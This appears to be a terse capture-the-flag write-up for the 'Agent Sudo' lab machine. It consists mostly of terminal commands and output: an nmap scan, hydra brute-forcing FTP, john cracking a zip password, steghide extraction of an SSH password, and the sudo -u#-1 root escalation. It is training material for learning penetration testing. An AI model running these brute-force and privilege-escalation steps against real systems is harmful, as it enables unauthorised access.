```
┌──(xnv㉿xnv)-[~/thm/agent-sudo]
└─$ nmap -A 10.10.252.69

21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```
┌──(xnv㉿xnv)-[~/thm/agent-sudo]
└─$ hydra -l chris -P ~/rockyou.txt ftp://10.10.252.69

[21][ftp] host: 10.10.252.69   login: chris   password: *******
```

┌──(xnv㉿xnv)-[~/thm/agent-sudo]
└─$ unzip _cutie.png.extracted 

'''
cutie.png.extract
'''

```
┌──(xnv㉿xnv)-[~/thm/agent-sudo]
└─$ zip2john 8702.zip > hash.txt
```

```
┌──(root💀xnv)-[/home/…/thm/agent-sudo/_cutie.png.extracted]
└─# john hash.txt -wordlist=../../../../rockyou.txt 
```

```
alien            (8702.zip/To_agentR.txt)
```

```
┌──(xnv㉿Kali)-[~/thm/agent-sudo/_cutie.png.extracted]
└─$ 7z x 8702.zip 
```

```
┌──(xnv㉿xnv)-[~/thm/agent-sudo/_cutie.png.extracted]
└─$ cat To_agentR.txt 
```

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

```
DECODE BASE64    /  Area51
```

```
┌──(xnv㉿Kali)-[~/thm/agent-sudo]
└─$ steghide extract -sf cute-alien.jpg 
```

```
┌──(xnv㉿Kali)-[~/thm/agent-sudo]
└─$ cat message.txt     
```

```
Hi james,

Glad you find this message. Your login password is hackerrules!
```

```
james@agent-sudo:~$ cat user_flag.txt 
```

```
┌──(xnv㉿Kali)-[~/thm/agent-sudo]
└─$ scp james@10.10.209.115:/home/james/Alien_autospy.jpg 
```

```
james@agent-sudo:~$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

```
https://www.exploit-db.com/exploits/47502
```

```
james@agent-sudo:~$ sudo -u#-1 /bin/bash
```

```
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
```

```
root@agent-sudo:~#  cat /root/root.txt
```
